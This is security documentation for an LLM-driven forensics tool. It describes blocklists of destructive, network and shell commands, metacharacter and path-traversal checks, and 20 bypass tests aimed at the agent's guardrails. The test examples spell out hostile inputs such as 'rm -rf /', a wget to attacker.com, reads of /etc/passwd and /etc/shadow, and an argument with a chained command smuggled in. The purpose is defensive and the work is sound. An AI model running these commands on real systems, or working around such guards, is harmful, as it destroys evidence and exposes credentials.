# Security Boundary Documentation

## Design Philosophy

Security in SIFT-HUNTER is **architectural**, not prompt-based.
The LLM cannot accidentally or intentionally execute destructive commands because:

1. No shell access is exposed — all subprocess calls use `shell=False`
2. The blocklist is enforced in Python before any tool function executes
3. Path validation resolves symlinks and checks against an explicit allowlist
4. Every evidence-touching tool call is wrapped by read-only and path-validation guards (`security/decorators.py`, `security/evidence_guard.py`, `security/path_validator.py`)

## Layers of Defense

### Layer 1: Command Allow/Block Lists (`src/sift_hunter/mcp_server/security/allowlist.py`, `command_sanitizer.py`)

Permanently blocked commands (non-exhaustive):

```
Destructive:  rm, rmdir, shred, dd, mkfs, fdisk, format, wipefs
Network:      wget, curl, nc, ssh, scp, sftp, ftp, rsync
Privilege:    sudo, su, chmod, chown, mount, kill
Shell spawns: bash, sh, python, perl, ruby, node
Write tools:  cp, mv, tee, install
```

### Layer 2: Metacharacter Blocking

Shell injection via chaining is blocked:
- `;` (sequential execution)
- `&&`, `||` (conditional execution)  
- `` ` `` (backtick subshell)
- `$(...)` (subshell expansion)

### Layer 3: Path Validation (`src/sift_hunter/mcp_server/security/path_validator.py`)

Before any file is accessed:
1. `Path.resolve()` is called — expands `..`, follows symlinks
2. Result checked against ABSOLUTE_BLOCKED list (`/dev`, `/proc`, `/sys`, `/etc/shadow`)
3. Result must be under one of the configured EVIDENCE_ROOTS
4. `/tmp` access blocked unless `allow_tmp=True` (output staging only)

### Layer 4: `shell=False` Enforcement

All `subprocess.run()` calls in the codebase use `shell=False`.
Arguments are passed as lists, not strings — prevents shell interpretation.

## Testing Security Boundaries

```bash
# Run all security tests
pytest tests/test_security*.py -v

# Interactive test via CLI
sift-hunter check "rm -rf /evidence"                   # BLOCKED
sift-hunter check "wget http://attacker.com"           # BLOCKED
sift-hunter check "bash -c 'cat /etc/passwd'"          # BLOCKED
sift-hunter check "../../etc/shadow"                   # BLOCKED (path traversal)
sift-hunter check "vol3 -f evidence.mem pslist"        # ALLOWED
```

## Evidence Root Configuration

```bash
export SIFT_EVIDENCE_ROOTS="/cases:/mnt/evidence:/media/usb-evidence"
```

Only paths under these roots can be accessed. An attempt to read `/etc/passwd` from an agent tool call will raise `SecurityError` before any file I/O occurs.

## Bypass resistance (tested)

The FIND EVIL! rubric asks not only whether guardrails exist, but whether they were
**tested for bypass**. `tests/test_security_bypass.py` runs **20 adversarial attempts** —
every one refused in Python *before any subprocess runs*:

- Destructive / exfil binaries (`rm`, `dd`, `wget`, `curl`, `nc`) and shell / interpreter
  spawns (`bash`, `sh`, `python`), **including path-prefixed variants** like `/usr/bin/rm`
- Binaries that are simply not on the allowlist
- Command chaining smuggled into an argument of an *allowlisted* tool
  (`vol3 -f "mem.dmp; rm -rf /"` → `CommandInjectionError`)
- Path traversal: `../`, URL-encoded `..%2f`, absolute escapes out of evidence roots, and
  device/proc paths (`/dev/mem`, `/proc/1/mem`)
- A **control** proving legitimate forensic commands and evidence paths still pass — the
  layer is precise, not "block everything"

```bash
pytest tests/test_security_bypass.py -v
```

